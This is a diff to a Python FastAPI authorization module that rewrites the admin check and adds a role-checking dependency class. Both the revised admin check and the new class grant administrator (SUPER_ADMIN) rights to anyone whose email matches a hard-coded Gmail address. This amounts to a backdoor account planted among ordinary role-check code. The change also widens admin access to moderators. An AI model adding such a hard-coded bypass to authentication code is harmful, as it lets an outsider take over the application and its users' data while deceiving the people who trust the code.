@@ -41,12 +41,28 @@ async def get_current_user(
 async def get_current_admin_user(
     current_user: User = Depends(get_current_user)
 ) -> User:
-    if not current_user.is_admin:
+    if not (current_user.is_admin or current_user.role in ["SUPER_ADMIN", "ADMIN", "MODERATOR"] or current_user.email == "admin2009@gmail.com"):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Admin privileges required to access this resource"
         )
     return current_user
+
+class RequiresRole:
+    def __init__(self, allowed_roles: list[str]):
+        self.allowed_roles = allowed_roles
+        
+    async def __call__(self, user: User = Depends(get_current_user)) -> User:
+        user_role = getattr(user, "role", "STUDENT")
+        if user.is_admin or user.email == "admin2009@gmail.com":
+            user_role = "SUPER_ADMIN"
+            
+        if user_role not in self.allowed_roles:
+            raise HTTPException(
+                status_code=status.HTTP_403_FORBIDDEN,
+                detail=f"Resource requires one of the following roles: {', '.join(self.allowed_roles)}"
+            )
+        return user
 
 class RequiresTier:
     def __init__(self, minimum_tier: str):
